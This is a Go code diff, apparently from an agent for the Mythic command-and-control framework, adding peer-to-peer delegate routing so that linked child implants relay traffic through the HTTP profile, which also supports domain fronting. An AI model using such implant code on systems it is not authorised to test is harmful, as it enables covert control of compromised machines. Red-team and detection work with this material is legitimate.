@@ -37,6 +37,12 @@ type HTTPProfile struct {
 	HostHeader    string // Override Host header for domain fronting
 	client        *http.Client
 	CallbackUUID  string // Store callback UUID from initial checkin
+
+	// P2P delegate hooks — set by main.go when TCP P2P children are supported.
+	// GetDelegates returns pending delegate messages from linked children to forward to Mythic.
+	// HandleDelegates routes incoming delegate messages from Mythic to the appropriate children.
+	GetDelegates    func() ([]structs.DelegateMessage, []structs.P2PConnectionMessage)
+	HandleDelegates func(delegates []structs.DelegateMessage)
 }
 
 // NewHTTPProfile creates a new HTTP profile
@@ -226,6 +232,14 @@ func (h *HTTPProfile) GetTasking(agent *structs.Agent, outboundSocks []structs.S
 		C2Profile:   "http",
 	}
 
+	// Collect delegate messages from linked P2P children
+	if h.GetDelegates != nil {
+		delegates, _ := h.GetDelegates()
+		if len(delegates) > 0 {
+			taskingMsg.Delegates = delegates
+		}
+	}
+
 	body, err := json.Marshal(taskingMsg)
 	if err != nil {
 		return nil, nil, fmt.Errorf("failed to marshal tasking message: %w", err)
@@ -323,6 +337,18 @@ func (h *HTTPProfile) GetTasking(agent *structs.Agent, outboundSocks []structs.S
 		if socksRaw, err := json.Marshal(socksList); err == nil {
 			if err := json.Unmarshal(socksRaw, &inboundSocks); err != nil {
 				log.Printf("Warning: failed to parse SOCKS messages: %v", err)
+			}
+		}
+	}
+
+	// Route delegate messages from Mythic to linked P2P children
+	if h.HandleDelegates != nil {
+		if delegateList, exists := taskResponse["delegates"]; exists {
+			if delegateRaw, err := json.Marshal(delegateList); err == nil {
+				var delegates []structs.DelegateMessage
+				if err := json.Unmarshal(delegateRaw, &delegates); err == nil && len(delegates) > 0 {
+					h.HandleDelegates(delegates)
+				}
 			}
 		}
 	}
@@ -433,6 +459,17 @@ func (h *HTTPProfile) PostResponse(response structs.Response, agent *structs.Age
 		Socks:     socks,
 	}
 
+	// Collect delegate messages and edge notifications from linked P2P children
+	if h.GetDelegates != nil {
+		delegates, edges := h.GetDelegates()
+		if len(delegates) > 0 {
+			responseMsg.Delegates = delegates
+		}
+		if len(edges) > 0 {
+			responseMsg.Edges = edges
+		}
+	}
+
 	body, err := json.Marshal(responseMsg)
 	if err != nil {
 		return nil, fmt.Errorf("failed to marshal response message: %w", err)
@@ -487,6 +524,21 @@ func (h *HTTPProfile) PostResponse(response structs.Response, agent *structs.Age
 		}
 	} else {
 		decryptedData = respBody
+	}
+
+	// Route any delegate responses from Mythic to linked P2P children
+	if h.HandleDelegates != nil && len(decryptedData) > 0 {
+		var postRespData map[string]interface{}
+		if err := json.Unmarshal(decryptedData, &postRespData); err == nil {
+			if delegateList, exists := postRespData["delegates"]; exists {
+				if delegateRaw, err := json.Marshal(delegateList); err == nil {
+					var delegates []structs.DelegateMessage
+					if err := json.Unmarshal(delegateRaw, &delegates); err == nil && len(delegates) > 0 {
+						h.HandleDelegates(delegates)
+					}
+				}
+			}
+		}
 	}
 
 	return decryptedData, nil
